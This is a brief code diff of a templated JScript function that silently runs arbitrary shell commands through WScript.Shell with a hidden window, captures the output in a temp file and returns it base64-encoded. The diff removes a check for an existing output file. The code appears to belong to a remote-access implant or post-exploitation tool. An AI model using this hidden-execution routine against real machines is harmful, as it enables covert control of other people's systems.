@@ -3,9 +3,6 @@ function cmd(command) {
   stdout_path = tmp + '\\{{ command_stdout }}.txt';
   fs = new ActiveXObject("Scripting.FileSystemObject");
   compsec = wscriptshell.ExpandEnvironmentStrings("%COMSPEC%");
-  if (fs.FileExists(stdout_path)) {
-    return b64e(stdout_path + ' already exists, please remove before running commands.');
-  }
   command = compsec + ' /c ' + command + ' 1> ' + stdout_path + ' 2>&1';
   try {
     wscriptshell.Run(command, 0, true);
